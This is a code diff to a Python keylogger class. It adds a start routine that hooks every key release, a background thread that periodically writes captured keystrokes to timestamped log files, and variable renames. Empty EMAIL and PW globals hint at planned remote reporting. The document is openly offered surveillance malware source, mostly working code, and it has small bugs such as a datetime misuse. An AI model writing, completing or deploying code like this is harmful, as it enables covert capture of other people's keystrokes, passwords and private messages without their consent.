@@ -4,12 +4,17 @@
 
 import keyboard
 import datetime
-
+from threading import Thread
+from time import sleep
 # global variables
 INTERVAL = 60
 EMAIL = ""
 PW = ""
 
+
+
+# should call start function to begin everything
+# when running start, best practice to call it in a seperate thread
 
 class keylogger:
 
@@ -28,36 +33,49 @@ class keylogger:
 
     # https://github.com/boppreh/keyboard#keyboard.on_release_key
     # https://github.com/boppreh/keyboard#keyboard.hook
+
+
+    def start(self):
+        self.start_date = datetime.now()
+        keyboard.on_release(callback = self.callback)
+        
+        thread = Thread(target = self.report)
+        thread.start()
+        
+        while True:
+            sleep(0.1)
+
     def callback(self, event):
         # callback is called when a key is released
         # event is defined as an attribute "name"
 
         key = event.name
 
-        if len(name) > 1:
+        if len(key) > 1:
             # is a special character i.e (alt, ctrl, etc)
-            if name == "space":
-                name = " "
+            # specifically this is to ensure only characters are in log files
+            if key == "space":
+                key = " "
 
-            elif name == "enter":
-                name = "[ENTER]\n"
+            elif key == "enter":
+                key = "[ENTER]\n"
 
-            elif name == "decimal":
-                name = "."
+            elif key == "decimal":
+                key = "."
 
             else:
                 # replace spaces with underscores
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
+                key = key.replace(" ", "_")
+                key = f"[{key.upper()}]"
         # append key to global log
-        self.log += name
+        self.log += key
 
     # local file functions for saving keylogs locally
     def assign_filename(self):
          # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+        start_date_str = str(self.start_date)[:-7].replace(" ", "-").replace(":", "")
+        end_date_str = str(self.end_date)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_date_str}_{end_date_str}"
 
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
@@ -66,5 +84,29 @@ class keylogger:
         with open(f"sample_logs/{self.filename}.txt", "w") as f:
             # write the keylogs to the file
             print(self.log, file=f)
-            
+
         print(f"[+] Saved {self.filename}.txt")
+    
+    def report(self):
+        while True:
+            if self.log:
+                self.end_date = datetime.now()
+                self.assign_filename()
+
+                # to implement new reporting methods add here:
+                if self.report_method == "local":
+                    self.report_to_file()
+
+                # reset variables
+                self.start_date = datetime.now()
+            
+            self.log = ""
+            
+            t = INTERVAL
+
+            # this is interval periods, could implement this in threads so the load is more balanced
+            while t != 0:
+                t -= 1
+                sleep(1)
+
+
